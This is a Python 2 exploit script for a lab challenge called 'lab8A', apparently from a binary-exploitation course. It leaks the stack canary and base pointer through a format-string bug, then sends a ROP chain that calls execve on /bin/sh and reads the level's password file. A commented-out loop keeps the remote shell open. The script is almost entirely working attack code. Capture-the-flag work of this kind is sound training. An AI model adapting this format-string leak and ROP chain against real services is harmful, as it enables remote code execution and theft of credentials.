#!/usr/bin/python
# coding: utf-8

'''
RCE Exploit for level lab8A
'''

#   Exploitation: Basically, we will leverage the format string bug in
# selectABook() to steal the stack canary and then abuse the stack smash bug
# in findSomeWords() to place our ROPchain and get the flag.

import socket
import struct
import time

##################
#  Global stuff  #
##################

PORT = 8841
# ****** IMPORTANT ******
# These values depend either on your VM configuration or the way your binary
# was compiled, please check that they are the same as yours before executing
# this exploit.
HOST = '10.0.0.2'
# Gadgets:
# g1 : pop edx ; pop ecx ; pop ebx ; ret
# g2 : pop eax ; ret
# g3 : int 0x80
g1 = 0x0806f250
g2 = 0x080bc506
g3 = 0x08048ef6
# ***********************


def sendrecv(s, buf, rec=True):
    '''
    Sends raw data to the remote process and returns it's output.
    '''
    s.sendall(buf)
    time.sleep(0.02)
    if rec:
        return s.recv(2048)
    return None


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print '[+] Connecting with remote host @ %s:%d' % (HOST, PORT)
        s.connect((HOST, PORT))
        print '[+] Connection accepted!'

        print '\n[+] Stage 1: Leaking stuff'
        out = sendrecv(s, '%130$08x_%131$08x\n')
        i = out.find('_')
        if i < 0:
            raise RuntimeError('Leek failed :( re-run the exploit plz')
        ck = int(out[i-8:i], 16)  # Stack cookie
        bp = int(out[i+1:i+9], 16)  # main()'s base pointer
        print '[+] Leaked cookie (0x%08x) and base pointer (0x%08x)' % (ck, bp)

        # Continue
        print '\n[+] Here, have something to read while I do my stuff :)',
        print sendrecv(s, '\x00\n')

        print '\n[+] Stage 2: Build ROP chain and bypass custom SSP'
        # First, compute the buffer address, here is where /bin/sh will be
        binsh = bp - 0x40
        buf = '/bin/sh\x00'+'A'*8
        # Bypass Smash Stack Protection
        buf += struct.pack('<III', 0xdeadbeef, 0x13371337, ck)
        buf += 'AAAA'
        buf += struct.pack('<IQI', g1, 0, binsh)  # Prepare gadget1
        buf += struct.pack('<II', g2, 0xb)        # Prepare gadget2
        buf += struct.pack('<I', g3)              # Prepare gadget3
        print '[+] ROP chain ready!'

        print '\n[+] Welcome to stage 3. Invoking ROP chain and getting flag'
        sendrecv(s, buf, False)
        flag = sendrecv(s, 'cat /home/lab8end/.pass\n')
        print '[+] flag: %s' % flag

        # Uncomment this to keep the shell
        # while True:
        #    print sendrecv(s, raw_input('(shell) ')+'\n')
    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, aborting...'
    except RuntimeError as e:
        print '[!] Error: %s' % e
    except socket.error as e:
        print '[!] Communication error: %s' % e
    finally:
        s.close()
